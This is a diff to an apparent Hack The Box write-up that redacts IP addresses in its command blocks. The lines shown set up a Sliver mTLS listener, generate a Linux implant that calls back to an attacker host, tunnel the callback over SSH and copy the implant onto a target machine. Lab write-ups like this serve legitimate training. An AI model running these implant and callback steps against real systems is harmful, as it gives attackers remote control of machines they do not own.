@@ -230,7 +230,7 @@ ssh -f -N -L 10.10.15.x:443:127.0.0.1:4443 debian@192.168.36.x
 **Generate implant:**
 ```
 mtls -L 0.0.0.0 -l 4443
-generate --mtls 10.10.15.1:443 --os linux --arch amd64 --save /tmp/htb_implant --skip-symbols
+generate --mtls 10.10.15.x:443 --os linux --arch amd64 --save /tmp/htb_implant --skip-symbols
 ```
 
 **Transfer and execute:**
@@ -375,10 +375,10 @@ cat user.txt
 ```bash
 # On Sliver Server
 mtls -L 0.0.0.0 -l 4443
-generate --mtls 10.10.15.1:443 --os linux --arch amd64 --save /tmp/htb_implant --skip-symbols
+generate --mtls 10.10.15.x:443 --os linux --arch amd64 --save /tmp/htb_implant --skip-symbols
 
 # On Kali (SSH tunnel for network routing)
-ssh -f -N -L 10.10.15.1:443:127.0.0.1:4443 debian@192.168.36.209
+ssh -f -N -L 10.10.15.x:443:127.0.0.1:4443 debian@192.168.36.x
 
 # Transfer implant
 scp /tmp/htb_implant nathan@10.129.3.86:/tmp/htb_implant
